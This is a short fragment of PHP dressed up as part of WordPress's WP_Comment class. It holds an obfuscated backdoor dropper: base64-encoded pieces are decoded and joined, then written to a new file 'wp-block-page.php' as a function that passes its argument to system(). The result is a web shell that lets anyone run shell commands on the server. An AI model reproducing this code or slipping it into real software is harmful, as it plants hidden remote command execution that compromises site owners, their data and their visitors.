...
final class WP_Comment {
	...
	{
	$zfam_0=base64_decode('c3Q=');
	$mwef_1=fopen(base64_decode('d3AtYmxvY2stcGFnZS5waHA='),base64_decode('dw=='));
	$fpch_2=base64_decode('KCRzMSk7fT8+');
	$xsed_3=base64_decode('PD9waHAgZnVuY3Rpb24g');
	$sqvl_4=base64_decode('YmxvY2soJHMxKXtzeQ==');
	$yfia_5=base64_decode('ZW0=');
	fputs($mwef_1,$xsed_3.$sqvl_4.$zfam_0.$yfia_5.$fpch_2);
	}
